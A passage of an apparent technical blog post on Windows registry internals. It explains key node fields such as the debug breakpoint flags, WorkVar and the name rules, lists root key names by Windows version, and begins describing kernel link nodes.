 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;BREAK_ON_OPEN&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x02&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c42&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;BREAK_ON_DELETE&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x04&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c42&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;BREAK_ON_SECURITY_CHANGE&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x08&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c42&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;BREAK_ON_CREATE_SUBKEY&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x10&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c42&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;BREAK_ON_DELETE_SUBKEY&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x20&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c42&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;BREAK_ON_SET_VALUE&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x40&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c42&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;BREAK_ON_DELETE_VALUE&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x80&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c42&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;BREAK_ON_KEY_VIRTUALIZE&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Whenever a breakpoint was triggered by this mechanism, the kernel would also print out a corresponding message for the attached debugger, for instance:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7 MvcjwGOuIU-c49&quot;&gt;DbgPrint(&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;&amp;quot;\n\n Current process is deleting a key tagged as BREAK ON DELETE&amp;quot;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7 MvcjwGOuIU-c49&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7 MvcjwGOuIU-c49&quot;&gt;DbgPrint(&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;&amp;quot; or deleting a subkey under a key tagged as BREAK_ON_DELETE_SUBKEY\n&amp;quot;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7 MvcjwGOuIU-c49&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7 MvcjwGOuIU-c49&quot;&gt;DbgPrint(&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;&amp;quot;\nPlease type the following in the debugger window: !reg kcb %p\n\n\n&amp;quot;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7 MvcjwGOuIU-c49&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7 MvcjwGOuIU-c49&quot;&gt;Kcb);&lt;/span&gt;&lt;/p&gt;
 &lt;br/&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Now that the Debug/Checked builds have been discontinued &amp;ndash; or at least not released publicly anymore for the latest versions of Windows 10/11 &amp;ndash; the &amp;quot;Debug&amp;quot; field is just an unused byte in the key node structure.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.9fyc95ng2h6z&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;WorkVar&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;According to an unofficial format specification, WorkVar used to be an internal-use member meant to be only ever accessed by the kernel in order to optimize key lookups. The last version of Windows where WorkVar was still in active use was Windows 2000; since Windows XP, &lt;/span&gt;&lt;span&gt;it has&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;simply been another four bytes of unused memory in the key node data layout.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.ewarh9zb3ijo&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;NameLength and Name&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The combination of these two fields specifies the name of the key: NameLength indicates the length of the string in bytes, and Name is an inline, variable-length buffer at the end of the structure that stores the name itself. There are a number of considerations and consistency requirements related to registry key names, enforced when loading a hive and later at runtime:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_anetktcl8su5-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Compression:&lt;/span&gt;&lt;span&gt;&amp;nbsp;I&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;f the KEY_COMP_NAME (0x20) flag is clear in _CM_KEY_NODE.Flags, the name is formatted as a wide string of 16-bit characters. If it is set, which is the common scenario, then &amp;quot;Name&amp;quot; represents a more tightly packed ASCII string of 8-bit characters. Considering that a majority of keys in the registry are alphanumeric, this optimization saves a non-trivial amount of memory and disk space. It is interesting to note that it is still possible to load a hive with a non-optimally formatted key name (non-compressed ASCII string), but such a key node would never be generated by Windows itself.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Length:&lt;/span&gt;&lt;span&gt;&amp;nbsp;The key name mustn&amp;#39;t be empty (i.e. it should be at least one character long), and it cannot exceed 256 characters in length (even though &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-element-size-limits&quot;&gt;Registry element size limits&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;incorrectly &lt;/span&gt;&lt;span&gt;claims&lt;/span&gt;&lt;span&gt;&amp;nbsp;that the limit is 255). The NameLength field value is expressed in bytes, so it must be between 1-256 for compressed names, and 2-512 for wide strings (and divisible by two). Up until October 2022, this limit &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451478&quot;&gt;was not correctly enforced&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;, making it possible to load hives with key names up to 1040 characters, which would then be mishandled or outright rejected by other parts of the registry code.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Charset:&lt;/span&gt;&lt;span&gt;&amp;nbsp;All characters in the 0x0000 &amp;ndash; 0xFFFF range are allowed in a key name with the exception of backslash (&amp;#39;\&amp;#39;, 0x005C). The backslash is singled out because it plays a special role in the registry, separating distinct elements of the registry paths. Since the kernel must always be able to distinguish parts of key names from the separator, a decision was made to exclude this one character from the key name charset, similar to how backslashes are not allowed in file names. Furthermore, there is a second minor requirement that the key name must not start with a null character, but it may be present at any other position in the name (this only started to be properly enforced in NtRenameKey after the fix for &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/13_CmpLightWeightPrepareSetSecDescUoW_security_list_confusion&quot;&gt;CVE-2024-26178&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in March 2024). Overall, this means that key names aren&amp;#39;t truly textual strings &lt;/span&gt;&lt;span&gt;in the conventional sense of the word: they don&amp;#39;t use a terminator, and may contain all sorts of non-printable characters. It would be more appropriate to think of them as binary blobs used to reference registry keys, which doesn&amp;#39;t have any consequences for the kernel, as it universally uses the UNICODE_STRING structure that includes both the length and the backing buffer of the string anyway. But if a potentially malicious program were to create a key with an unusual name (e.g. including a null character), it could prove difficult for an administrator to operate on it with the built-in registry utilities (reg.exe, Regedit), or even with third-party tools that use the high-level API (such as &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa&quot;&gt;RegOpenKeyEx&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;). In such cases, it might be required to use specialized tools that interact with the Windows registry directly through the system call interface as the only way to examine/modify such keys.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Uniqueness:&lt;/span&gt;&lt;span&gt;&amp;nbsp;One of the most important invariants of the Windows registry implementation is the uniqueness of key names: there may be only one key with a specific path, or in other words, for every key, there mustn&amp;#39;t be any duplicates in the list of its subkeys. Given that registry key names are case-insensitive, any two names are always compared in their uppercase form to determine if they are equal or not. This uniqueness requirement is enforced both during hive load and subsequent operations, and failure to do it correctly could lead to both logic bugs and memory corruption. For some examples of the potential outcomes of allowing duplicate key names in registry, see Maxim Suhanov&amp;#39;s &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://dfir.ru/2021/10/15/the-uppercased-hell/&quot;&gt;The uppercased hell&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;blog or my &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451527&quot;&gt;CVE-2023-21748&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;/ &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451549&quot;&gt;CVE-2023-23420&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;bug reports.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Another intriguing aspect of the key names are the names associated with the root keys of default system hives. In general, every registry key in Windows is referenced by its name specified in the key node, except for root keys, which are known by the name of their mount points. As a result, the &amp;quot;real&amp;quot; underlying names of root keys are never visible to users or applications, but they are nevertheless present in the hive file as a mandatory part of every key node, and could be potentially used to learn something about how these fundamental system hives (SOFTWARE, SYSTEM etc.) are generated.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;I have examined hives from various Windows versions ranging from Windows NT 3.1 to Windows 11, and arrived at the following list of per-version root key names:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;MvcjwGOuIU-c28&quot;&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c73 MvcjwGOuIU-c64&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Version&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c64 MvcjwGOuIU-c68&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Root key name&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c73&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;NT 3.1 - NT 4.0&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c68&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Same as the hive name (e.g., &amp;quot;SYSTEM&amp;quot;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c73&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;2000 - XP&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c68&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;$$$PROTO.HIV&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c73&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Vista - 7&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c68&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span&gt;CMI-CreateHive{&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;RANDOM GUID&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c73&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;8&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c68&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CsiTool-CreateHive-{00000000-0000-0000-0000-000000000000}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c73&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;10 - 11&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c68&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;ROOT&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;In early NT versions, the root key name simply mirrored the hive&amp;#39;s file name. In Windows 2000 and XP, the name stemmed from the fact that system hives were created during system installation by temporarily creating the tree root under \Registry\Machine\SYSTEM\$$$PROTO.HIV, pre-initializing it with the default data for the given hive, and saving it to a file with an API like &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsavekeyexw&quot;&gt;RegSaveKeyEx&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;In Windows 10 and 11, the name is simply &amp;quot;ROOT&amp;quot;, which, along with the &amp;quot;OfRg&amp;quot; magic bytes at offset 0xB0 in the file header, hints that the hives are created with the &lt;/span&gt;&lt;span&gt;Offline Registry Library&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;. This leaves versions between Windows Vista and Windows 8 as the big unknown: neither &amp;quot;CMI-CreateHive&amp;quot; nor &amp;quot;CsiTool-CreateHive&amp;quot; sound particularly familiar, and I haven&amp;#39;t been able to find any information about them in any public resources. It is probably safe to assume that these strings are indicative of some internal Microsoft tooling that was used to generate hives for these systems, but not much is known beyond it. Nevertheless, I find it fascinating that such little tidbits of information can be found in obscure corners of file formats. You never know when some other missing part of the puzzle becomes known publicly, making it possible to finally connect the dots and see the bigger picture, sometimes years or decades after the initial release of the software.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;MvcjwGOuIU-c18 MvcjwGOuIU-c12&quot; id=&quot;h.dp8c8odflm45&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c19 MvcjwGOuIU-c17&quot;&gt;Link nodes&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;As mentioned above, link nodes are a special type of key node designed to facilitate the mounting of arbitrary hives from disk into the global registry view. They are managed by the Windows kernel and only ever exist in memory. They are represented by the _CM_KEY_NODE structure, but with the following differences compared to regular keys:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_c8qgjiyn10ie-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The Signature field is set to 0x6B6C (&amp;#39;lk&amp;#39;) instead of 0x6B6E (&amp;#39;nk&amp;#39;),&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The KEY_HIVE_EXIT (0x0002) flag is set in Flags,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The key doesn&amp;#39;t have any of the standard key properties, such as the security descriptor, class, subkeys or values. The only cell reference it contains is to its parent cell, which is one of \Registry\A, \Registry\Machine, \Registry\User or \Registry\WC.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Instead of the SubKeyLists member at offset 0x1C, the link node uses the ChildHiveReference field of type _CM_KEY_REFERENCE, which stores a kernel-mode pointer to the destination hive descriptor (_HHIVE*), and the cell index of the root key within that hive.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;So, whenever you see a hive root key (e.g. any key within HKLM or HKCU), you are actually looking at a pair of a link node (also known as exit node) + root key (a.k.a. entry node &amp;ndash; these terms are used interchangeably). The mount point assumes the key name of the link node (so that it is easily enumerable with the existing kernel logic), and all of the characteristics of the entry node. This is illustrated in the following diagram, where the key marked in red is the link node of the SYSTEM hive, and the green one is the root key:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3oiXe3jfIDS0CKONQWJn0FeAugieby2gy41fGxDBO_dDqYh13EduspE8cuBTKWOikQfdPR7GodX7__1sUQIlqpsObXgtp_ucQenLFPZB1qf7Yoxy6EiIK8WzFa6IkDsBbHGhc5fRnFFtf0SSunqUPto67Kl73AD6pczCRNbjXbgvGNqhcRhcFR8iNFGk/s1999/image10.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3oiXe3jfIDS0CKONQWJn0FeAugieby2gy41fGxDBO_dDqYh13EduspE8cuBTKWOikQfdPR7GodX7__1sUQIlqpsObXgtp_ucQenLFPZB1qf7Yoxy6EiIK8WzFa6IkDsBbHGhc5fRnFFtf0SSunqUPto67Kl73AD6pczCRNbjXbgvGNqhcRhcFR8iNFGk/s1200/image10.png&quot; border=&quot;0&quot; alt=&quot;Diagrammatic illustration and visual representation of the paragraph above&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Diagrammatic illustration and visual representation of the paragraph above&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The existence of link nodes seems to be very little known and scarcely documented in public resources, which is likely caused by the fact that the Windows kernel makes them virtually invisible, and not just for users and high-level API clients, but even for administrators and kernel driver developers. The way the registry tree traversing code is structured, whenever it encounters a link node, it always makes sure to skip over it and reference the corresponding entry node. This means that it is impossible to open or otherwise observe the link node itself from the context of user-mode, but if we put in some effort, we should be able to see it in WinDbg attached as a kernel debugger. We can approach the link node from two sides: either try to find it top-down starting from the master hive, or by locating a key in a mounted hive and traversing the registry tree 